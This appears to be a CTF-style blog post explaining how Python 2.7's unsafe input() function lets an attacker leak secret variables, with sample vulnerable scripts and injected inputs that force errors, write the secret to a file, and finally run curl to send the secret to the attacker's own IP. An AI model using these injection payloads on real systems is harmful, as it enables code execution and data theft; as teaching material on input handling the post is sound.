---
title: Python - Hacking with style - input
description: Magic python input to compromise scripts
categories: python
author: Xh4H
tags: python proof-of-concept shell input vulnerability
---

This is the second part of [Python 2.7 input security issues](https://posts.xh4h.com/python/2019/08/02/input_poc.html) post.

In this post we will see what can be done appart from spawning a shell.

<br>

# Getting variable values

## Case 1 - string variable:

We are given a piece of code with hidden variable values:

```py
import string, random

flag = "xxxxxxxxxxxxxxxxxxx"
password = ''.join(random.choice(string.ascii_lowercase) for i in range(11))

if input("Password > ") == password:
	print "Awesome!"
else:
	print "Wrong!"
```

This simple script generates a 11 char length string, and we have to guess it.

There's `flag` variable, and we are interested on getting it's value.

A simple method is generating an error using that variable with `input`:

<div style="text-align:center"><img src="/assets/images/python2_image_1.png" /></div>

By attempting to parse to int a string that is not solely filled by numbers we will get an exception error, and since it did not get handled, we get the raw error output, containing, so, the variable content.

`1_am_s0_1nT3r3stinG`

## Case 2 - numeric variable:

In the following scenario the flag will only be numbers. We will re-use the same code from `Case 1`.

<div style="text-align:center"><img src="/assets/images/python2_image_2.png" /></div>

In this case we can't take advantage of parse to int feature, oh well, maybe we can...

<div style="text-align:center"><img src="/assets/images/python2_image_3.png" /></div>

What we did above is pretty simple. Given a string variable filled by numbers, we can concatenate a non-numeric character and afterwards parse to int the variable, getting so, our flag (removing, of course, the last character we added).

`123542562362161346`

## Case 3 - exceptions handled:

We took advantage of non-existant exception handling in the previous 2 cases.

Now we are given a script that is handling any exception. How can we get our precious flag?

```py
import string, random

flag = "xxxxxxxxxxxxxxxxxxxxxxxxxxxx"
password = ''.join(random.choice(string.ascii_lowercase) for i in range(11))

try:
	if input("Password > ") == password:
		print "Awesome!"
	else:
		print "Wrong!"
except Exception as e:
	print "What are you doing?!"
```

If we put into practice the previous technique, we will get the `What are you doing?!` print, since any exception is being handled now.

We are going to have a look at **two** different techniques.

_Please note, `Case 3.2` can also be solved with `Case 3.1`, but the aim is having different cases to explore different possibilities._

### Case 3.1 - Re-using input function over and over ...

First let's understand how `input` function is used:

```py
input("Hey, write something here: ")
```

This piece of code will print ``Hey, write something here: `` and then ask for user input.

Since it is expecting a string, we can pass the flag as parameter.

<div style="text-align:center"><img src="/assets/images/python2_image_4.png" /></div>

``3xc3pt10n_h4ndl1ng?s0_funny!``

### Case 3.2 - Having access to the script location

If we have, let's say `ssh` access to the server where the script is being hosted, we can output the flag variable content to a file, and then read it.

With the following input, we will create a file called `my_flag` and write the flag to it.

```py
open("my_flag", "w").write(flag)
```

<div style="text-align:center"><img src="/assets/images/python2_image_5.png" /></div>

``3xc3pt10n_h4ndl1ng?s0_funny!``

### Case 3.3 - Remote connection? CURL it to me please!

Final case, let's imagine that this script is listening in port 8000. We don't have access to the server, we are establishing a connection using netcat `nc`.

We can execute a system command and curl the content of a variable through our pc.

First, set up an http listener using port 80:

```sh
python -m SimpleHTTPServer 80
```

Second, figure out our IP address. We have to take into account whether we are in a private network to access the server where that script is located.
Let's say we used an `OpenVPN` profile to be able to `netcat` to the target server. It is very likely that the target server won't have access to external IPs, therefore we will have to get our tunnel IP (tun0).

```sh
ifconfig tun0
```

<div style="text-align:center"><img src="/assets/images/python2_image_6.png" /></div>

We are going to use the following IP: ``10.10.14.7``.

We are now ready to retrieve that flag!

With the following line, we will be able to execute a bash system command, call curl appending to the url the variable we want:

```py
__import__('os').system("curl http://10.10.14.7/" + flag)
```

<div style="text-align:center"><img src="/assets/images/python2_image_7.png" /></div>

``3xc3pt10n_h4ndl1ng?s0_funny!``

<br>
<br>

Thanks for reading :)

<script src="https://www.hackthebox.eu/badge/21439"></script>